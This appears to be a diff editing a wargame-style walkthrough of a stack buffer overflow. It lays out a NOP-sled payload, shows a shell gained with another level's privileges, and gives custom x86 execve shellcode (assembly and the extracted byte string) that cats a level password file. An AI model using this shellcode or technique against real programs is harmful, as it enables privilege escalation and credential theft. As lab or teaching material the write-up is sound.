@@ -163,20 +163,20 @@ gs             0x33	51
 (gdb) q
 
 Ok, the saved return address is overwritten so I know how long my string needs to be. 
-The shellcode I will use is 24 bytes, so 272 bytes was what i needed to overwrite the saved return 
-address, so 272 - 4 bytes for return address - 24 bytes for the shellcode = 244. 
-I'm gonna use nops (0x90) instead of A (0x41) so i can use point the return adress into
-the middle of the nops and hit my shellcode. I dont wanna be exact because when i change
-the filename from ./vuln to ~/code/examples/vuln to get the real program instead of the
-copy, the address will change slightly due to the length of the filename. This way the
-slight difference won't matter.
+The shellcode I will use is 24 bytes and 272 bytes is what i need to overwrite the saved return 
+address. So 272 - 4 bytes for return address - 24 bytes for the shellcode = 244. I'm going to 
+use a nopsled by using 0x90 instead of 0x41 and pointing the return address into the middle of
+the nops. This will cause the processor to just cycle through the nops until it hits my shellcode. 
+I dont want to be exact because when i change the filename from ./vuln to ~/code/examples/vuln to 
+run the real program instead of the copy, the address will change slightly due to the length of 
+the filename. This way the slight difference won't matter.
 
 So my overflow string will be ...
         
-          [247 nops] [21 byte shellcode] [4 byte return address] 
+          [244 nops] [24 byte shellcode] [4 byte return address] 
 
 The return address needs to be little endian byte order 
-(x86 machines are little endian. sparc, ARM is big endian) 
+(x86 machines are little endian. sparc, ARM are big endian) 
 so if 0xdeadbeef was the return address, we would have to reverse it like so...
 
           de ad be ef => ef be ad de => \xef\xbe\xad\xde
@@ -237,7 +237,7 @@ uid=1006(level4) gid=1006(level4) euid=1007(level5) groups=1006(level4)
 sh-3.2$ zing!
 
 Now that I've got it all down, I can write a proper exploit. 
-While i'm at it, may as well have a little fun with this and write 
+While i'm at it, I may as well have a little fun with this and write 
 some custom shellcode to cat the password file for me.
 
 I'll create a file just to test it out...
@@ -259,16 +259,16 @@ _start:
     push  0x7361702f   ; 
     mov   ecx, esp     ; pointer to /pass/level40
     push  eax          ; null
-    push  ecx          ; pointer to file
-    push  ebx          ; pointer to cat
-    mov   ecx, esp     ; move it to ecx
+    push  ecx          ; pointer to the file
+    push  ebx          ; pointer to /bin/cat
+    mov   ecx, esp     ; put it all in ecx
     mov   al, 11       ; execve syscall
     int   80h          ; call the kernel
 
-now compile it and check out the opcodes.
+now compile it and check for null bytes in the opcodes.
 
 (on an x86_64 system you would need to comile it with
-"nasm -f elf32 sh.asm" and "ld -melf_i386 -o sh sh.o")
+"nasm -f elf32 sh.asm" and "ld -m elf_i386 -o sh sh.o")
 
 l3thal@pandora:/tmp/moo$ nasm -f elf sh.asm
 l3thal@pandora:/tmp/moo$ ld -o sh sh.o
@@ -296,7 +296,8 @@ Disassembly of section .text:
   26:   b0 0b                   mov    al,0xb
   28:   cd 80                   int    0x80
 
-no nullbytes, so let's grab the opcodes 
+Normally you may need to repeat this cycle a few times to ensure you have no null bytes,
+This time we're good, so let's grab them with this trusty one liner...
 
 l3thal@pandora:/tmp/moo$ objdump -d ./sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x76\x65\x6c\x34\x68\x73\x2f\x6c\x65\x68\x2f\x70\x61\x73\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
